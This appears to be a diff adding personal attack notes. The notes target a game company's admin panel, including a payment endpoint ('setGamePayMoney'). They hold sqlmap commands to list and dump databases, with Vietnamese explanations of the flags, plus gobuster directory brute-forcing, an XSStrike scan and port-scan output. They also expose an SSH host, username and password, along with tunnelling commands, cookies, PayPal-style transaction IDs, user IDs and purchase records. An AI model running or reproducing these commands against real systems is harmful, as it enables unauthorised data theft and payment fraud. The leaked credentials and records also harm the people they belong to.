@@ -1,0 +1,60 @@
+python sqlmap.py –u "https://admin.instaplay.games/index.php?action=game-manager-setGamePayMoney&game_id=261" -D instaplay --tables
+
+
+ python sqlmap.py –u “http://zerocoolhf.altervista.org/level1.php?id=1” --dbs Khi đã xác định được url trên bị lỗi, sử dụng flag "--dbs" để liệt kê các database 
+
+
+ python sqlmap.py –u “http://zerocoolhf.altervista.org/level1.php?id=1” --tables –D my_zerocoolhf Như trong bài viết đã liệt kê được 2 database là my_zerocoolhf và infomation_schema -D my_zerocoolhf: báo cho sqlmap.py biết chương trình sẽ làm việc với database my_zerocoolhf --table: dùng để liệt kê các bảng trong database my_zerocoolhf 
+
+
+ python sqlmap.py –u “http://zerocoolhf.altervista.org/level1.php?id=1” --dump –D my_zerocoolhf –T book --dump: dùng để dump toàn bộ dữ liệu của bảng book 
+
+sqlmap -u http://www.sqldummywebsite.com/cgi-bin/item.cgi?item_id=15 -D 
+sqldummywebsite --tables
+
+47.88.55.0
+
+gobuster dir -u https://admin.instaplay.games -w test.txt
+
+
+gobuster dir -u https://admin.instaplay.games/index.php?action=game-manager-setGamePayMoney&game_id=270 -t 10 -w test.txt -x .php,.html
+
+gobuster -u https://admin.instaplay.games -w test.txt -t 100
+
+
+
+22	open	ssh	OpenSSH	7.4	protocol 2.0	
+80	open	http	nginx			
+443	open	https	nginx			
+8009	open	ajp13	Apache Jserv		Protocol v1.3	
+
+
+python xsstrike.py -u "https://admin.instaplay.games/index.php?action=game-manager-setGamePayMoney&game_id=270" --skip-dom
+
+
+204.12.215.108:22
+hant
+h4nt@#123
+
+ssh -L local_addr:local_port:remote_addr:remote_port -N 127.0.0.1
+ssh -vND 8888 user@host.com
+
+ssh -L local_addr:local_port:remote_addr:remote_port -N 127.0.0.1
+
+ssh -L 192.168.43.77:8888:204.12.215.108:22 -N 127.0.0.1
+
+https://translate.google.com/translate?hl=en&sl=auto&tl=en&u=https%3A%2F%2Fworld.taobao.com%2F
+
+_gcl_au=1.1.628036441.1586180593; G_ENABLED_IDPS=google; _ga=GA1.2.455350472.1586180596; _gid=GA1.2.1683319108.1586180596; _gat_gtag_UA_112517839_1=1
+
+5EG74967JL533571N
+8EF09546EL840287M
+00158692720042402m2g85u0yIGcPtKf0GuPfZw
+
+88959446 ->hant
+88957978 -> doanh
+88960707 -> mc quach
+88964808
+
+H5_6DC6542A97A430BB    98 Awaken Stone Giftpack x 2 	PAYPAL 	0.99 ( 1304平台币 ) 
+H5_E7F8B411C9CFAD62    388 Luchy Coin Giftpack x 2 	PAYPAL 	0.99 ( 5216平台币 ) 
